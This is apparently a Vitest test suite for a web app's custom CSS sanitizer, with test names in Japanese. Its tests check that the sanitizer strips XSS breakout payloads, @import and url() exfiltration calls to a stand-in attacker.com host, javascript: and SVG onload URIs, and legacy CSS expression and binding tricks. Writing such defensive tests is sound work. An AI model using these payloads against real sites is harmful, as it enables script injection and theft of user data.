import { describe, it, expect, beforeEach } from 'vitest';
import {
  sanitizeCustomCss,
  applyCustomCss,
  clearCustomCss,
  CUSTOM_CSS_STYLE_ID,
  MAX_CUSTOM_CSS_LENGTH,
} from '../src/utils/customCss';

describe('customCss sanitizer & application', () => {
  beforeEach(() => {
    clearCustomCss();
    const el = document.getElementById(CUSTOM_CSS_STYLE_ID);
    if (el) el.remove();
  });

  describe('sanitizeCustomCss', () => {
    it('通常の安全なCSSはそのまま保持されること', () => {
      const safeCss = `
        body {
          background-color: #f0f0f0;
          color: #333;
        }
        .mizuna-btn {
          border-radius: 12px !important;
        }
        @media (max-width: 600px) {
          .nav { display: none; }
        }
      `;
      const res = sanitizeCustomCss(safeCss);
      expect(res.sanitizedCss).toBe(safeCss);
      expect(res.warnings).toHaveLength(0);
    });

    it('HTMLタグ閉じ・脱出シーケンス (</style>, <script>) を無害化すること', () => {
      const malicious = '</style><script>alert("xss")</script><style>';
      const res = sanitizeCustomCss(malicious);
      expect(res.sanitizedCss).not.toContain('</style>');
      expect(res.sanitizedCss).not.toContain('<script>');
      expect(res.warnings.length).toBeGreaterThan(0);
    });

    it('大小文字や空白が混入したタグ閉じシーケンスを無害化すること', () => {
      const malicious = '<  /  StYlE  ><img src=x onerror=alert(1)>';
      const res = sanitizeCustomCss(malicious);
      expect(res.sanitizedCss.toLowerCase()).not.toContain('</style');
      expect(res.sanitizedCss).not.toContain('<img');
    });

    it('@import ルールを完全にブロックすること', () => {
      const malicious1 = '@import url("https://attacker.com/evil.css"); body { color: red; }';
      const res1 = sanitizeCustomCss(malicious1);
      expect(res1.sanitizedCss).not.toContain('@import');
      expect(res1.sanitizedCss).not.toContain('attacker.com');
      expect(res1.warnings.length).toBeGreaterThan(0);

      const malicious2 = '@import "https://attacker.com/evil.css";';
      const res2 = sanitizeCustomCss(malicious2);
      expect(res2.sanitizedCss).not.toContain('@import');
    });

    it('@import の難読化・エスケープをブロックすること', () => {
      const malicious = '@\\69 mport url("https://attacker.com/evil.css");';
      const res = sanitizeCustomCss(malicious);
      expect(res.sanitizedCss).not.toContain('attacker.com');
      expect(res.warnings.length).toBeGreaterThan(0);
    });

    it('外部URLへの参照 (url(http...), url(//...)) をブロックすること (CSS Exfiltration対策)', () => {
      const malicious = `
        body { background: url('https://attacker.com/leak?q=test'); }
        input[type="password"] { background: url("http://attacker.com/log"); }
        .token { background: url(//attacker.com/token); }
      `;
      const res = sanitizeCustomCss(malicious);
      expect(res.sanitizedCss).not.toContain('https://attacker.com');
      expect(res.sanitizedCss).not.toContain('http://attacker.com');
      expect(res.sanitizedCss).not.toContain('//attacker.com');
      expect(res.warnings.length).toBeGreaterThan(0);
    });

    it('安全なラスター画像の base64 data-URI は許可されること', () => {
      const safeDataUri = 'body { background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="); }';
      const res = sanitizeCustomCss(safeDataUri);
      expect(res.sanitizedCss).toContain('data:image/png;base64,');
      expect(res.warnings).toHaveLength(0);
    });

    it('スクリプトを含む可能性のある SVG data-URI や javascript: スキームはブロックされること', () => {
      const dangerous1 = 'body { background: url("javascript:alert(1)"); }';
      const res1 = sanitizeCustomCss(dangerous1);
      expect(res1.sanitizedCss).not.toContain('javascript:');

      const dangerous2 = 'body { background: url("data:image/svg+xml,<svg onload=alert(1)>"); }';
      const res2 = sanitizeCustomCss(dangerous2);
      expect(res2.sanitizedCss).not.toContain('svg+xml');
    });

    it('CSS expression, -moz-binding, behavior をブロックすること', () => {
      const malicious = `
        div { width: expression(alert('xss')); }
        * { -moz-binding: url('http://example.com/xbl'); }
        body { behavior: url(test.htc); }
      `;
      const res = sanitizeCustomCss(malicious);
      expect(res.sanitizedCss).not.toContain('expression(');
      expect(res.sanitizedCss).not.toContain('-moz-binding');
      expect(res.sanitizedCss).not.toContain('behavior:');
      expect(res.warnings.length).toBeGreaterThan(0);
    });

    it('最大長を超えたCSSは切り詰められること', () => {
      const hugeCss = 'a { color: red; } \n'.repeat(5000);
      expect(hugeCss.length).toBeGreaterThan(MAX_CUSTOM_CSS_LENGTH);

      const res = sanitizeCustomCss(hugeCss);
      expect(res.sanitizedCss.length).toBeLessThanOrEqual(MAX_CUSTOM_CSS_LENGTH);
      expect(res.warnings.some((w) => w.includes('最大許容量'))).toBe(true);
    });

    it('null または undefined の入力時は空文字と警告なしを返すこと', () => {
      expect(sanitizeCustomCss(null)).toEqual({ sanitizedCss: '', warnings: [] });
      expect(sanitizeCustomCss(undefined)).toEqual({ sanitizedCss: '', warnings: [] });
      expect(sanitizeCustomCss('')).toEqual({ sanitizedCss: '', warnings: [] });
    });
  });

  describe('applyCustomCss & clearCustomCss', () => {
    it('カスタムCSSを style 要素として head に適用できること', () => {
      const css = 'body { background-color: rgb(18, 52, 86); }';
      const res = applyCustomCss(css);
      expect(res.sanitizedCss).toBe(css);

      const el = document.getElementById(CUSTOM_CSS_STYLE_ID) as HTMLStyleElement | null;
      expect(el).not.toBeNull();
      expect(el?.textContent).toBe(css);
    });

    it('空文字列が渡された場合は style 要素のテキストが空になること', () => {
      applyCustomCss('body { color: blue; }');
      let el = document.getElementById(CUSTOM_CSS_STYLE_ID) as HTMLStyleElement | null;
      expect(el?.textContent).toContain('blue');

      applyCustomCss('');
      el = document.getElementById(CUSTOM_CSS_STYLE_ID) as HTMLStyleElement | null;
      expect(el?.textContent).toBe('');
    });

    it('clearCustomCss でクリアされること', () => {
      applyCustomCss('body { color: green; }');
      clearCustomCss();
      const el = document.getElementById(CUSTOM_CSS_STYLE_ID) as HTMLStyleElement | null;
      expect(el?.textContent).toBe('');
    });

    it('悪意あるタグを含んでいても textContent として安全に適用され、DOMインジェクションが発生しないこと', () => {
      const malicious = '</style><script id="evil-script">window.__hacked = true;</script>';
      applyCustomCss(malicious);

      // scriptタグがDOMとして生成されていないこと
      expect(document.getElementById('evil-script')).toBeNull();
      expect((window as any).__hacked).toBeUndefined();

      const el = document.getElementById(CUSTOM_CSS_STYLE_ID) as HTMLStyleElement | null;
      expect(el?.textContent).not.toContain('<script');
      expect(el?.textContent).not.toContain('</style>');
    });
  });
});
